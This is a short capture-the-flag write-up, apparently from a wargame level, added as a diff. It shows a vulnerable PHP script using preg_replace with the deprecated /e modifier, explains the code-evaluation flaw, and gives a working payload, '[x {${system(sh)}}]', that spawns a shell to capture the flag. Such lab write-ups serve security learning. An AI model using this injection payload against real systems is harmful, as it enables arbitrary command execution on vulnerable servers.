@@ -1,0 +1,14 @@
+$> cat level06.php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+
+We can see a vulnerability with preg_replace and the e regex.
+The '/e' modifier actually allows us to evaluate the second argument as a PHP expression.
+We create a script that will exploit this
+
+$> echo '[x {${system(sh)}}]' > /tmp/exploit
+
+$> ./level06 /tmp/exploit
+getflag
+
